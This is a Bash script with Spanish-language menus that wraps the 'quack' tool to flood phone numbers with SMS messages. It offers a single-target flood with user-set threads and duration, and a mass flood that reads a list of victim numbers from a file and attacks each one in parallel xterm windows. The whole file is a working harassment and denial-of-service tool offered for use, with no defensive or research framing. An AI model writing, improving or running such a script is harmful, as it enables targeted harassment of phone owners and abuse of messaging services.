
#!/bin/bash


#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"




if which quack >/dev/null; then
sleep 1
echo -e "$blue(quack)$nc ................................................... instalado [$green✓$nc]"
else
sleep 2
echo -e "$red(quack)$nc No instalado [$red✗$nc]"
sleep 1
echo "Instala escribiendo ejecutando el instalador ./install.sh"
sleep 0.25
exit 1
fi



if which xterm >/dev/null; then
sleep 1
echo -e "$blue(xtern)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 2
echo -e "$red(xterm)$nc No instalado [$red✗$nc]"
sleep 1
echo "Instala escribiendo [sudo apt-get install xterm -y]"
sleep 0.25
exit 1
fi

if which toilet >/dev/null; then
sleep 1
echo -e "$blue(toilet)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 2
echo -e "$red(toilet)$nc No instalado [$red✗$nc]"
sleep 1
echo "Instala escribiendo [sudo apt-get install toilet -y]"
sleep 0.25
exit 1
fi

if which figlet >/dev/null; then
sleep 1
echo -e "$blue(figlet)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 0.25
echo -e "$red(figlet)$nc No instalado [$red✗$nc]"
sleep 1
echo "Instala escribiendo [sudo apt-get install figlet -y]"
sleep 0.25
exit 1
fi

if which gem >/dev/null; then
sleep 1
echo -e "$blue(gem)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 0.25
echo -e "$red(gem)$nc No instalado [$red✗$nc]"
sleep 1
echo "Instala escribiendo [sudo apt-get install ruby -y]"
sleep 0.25
exit 1
fi








#directory verification
directory=$(pwd)


if [ ! -d $directory/numeros ]; then
mkdir $directory/numeros
touch $directory/numeros/numeros.txt
fi

#opciones menu

a="Sms flood (individual)"
b="Masive sms flood (muchos)"
c="Creditos"
d="Salir"
s="s"

#variables default




clear
toilet -f big "SmsFlood"  -F gay | lolcat
sleep 1
echo -e "$purple(*)$blue Created by$red Facundo Salgado"
sleep 2
echo -e "$purple(*)$blue Script Base$red Quack$blue"
sleep 2

export PS3=$'\e[01;35m(*)\e[01;32m Elige una Opcion:\e[01;33m '



function menuprincipal(){
echo
echo
select menu  in "$a" "$b" "$c" "$d";
do
case $menu in
$a)
printf "\e[1;32mIngrese los threads:\e[1;31m "
read threads
printf "\e[1;32mIngrese el tiempo(seg):\e[1;31m "
read timeout
printf "\e[1;32mIngrese el Numero (con codigo pais y area):\e[1;31m "
read target
echo -e "$purple(*)$blue enviando flood de SMS a $red $target$blue en$red 5$blue Segundos"
sleep 5
quack --threads $threads --timeout $timeout --tool SMS --target $target
clear
echo -e "$purple(*)$blue Ataque finalizado.. volviendo al menu"
sleep 2
menuprincipal


;;
$b)


echo -e "$purple(*)$blue Para esta opcion debera colocar los numeros en el siguiente PATH$red $directory/numeros/numeros.txt"
sleep 3
echo -e "$purple(*)$blue Debera colocar un numero por linea incluyendo el codigo de area y del pais"
sleep 4
printf "\e[1;32mIngrese los threads:\e[1;31m "
read threads
printf "\e[1;32mIngrese el tiempo(seg):\e[1;31m "
read timeout
echo -e "$purple(*)$blue Empezando flood masivo en 5 segundos.."
sleep 5
while read line
do
timeout --foreground $timeout$s xterm -hold -e "quack --threads $threads --timeout $timeout --tool SMS --target $line" & 
done < $directory/numeros/numeros.txt
clear
echo -e "$purple(*)$blue Ataque finalizado.. volviendo al menu"
sleep 2
menuprincipal




;;
$c)
echo -e "$purple(*)$blue Script base utilizado:$red Quack"
sleep 2
echo -e "$purple(*)$blue Script Bash y mejoras$red Facu Salgado"
sleep 2
echo -e "$purple(*)$blue mi github:$red github.com/bytesalgado"
sleep 2
echo -e "$purple(*)$blue mi Instagram$red @facukaku021"
sleep 2
echo -e "$purple(*)$blue mi twitter:$red @facukaku021$blue"
sleep 2
menuprincipal
;;
$d)
echo -e "$purple(*)$blue Saliendo del programa...$red goodbye$nc"
sleep 2
exit
;;
*)
;;
esac
done
}
menuprincipal
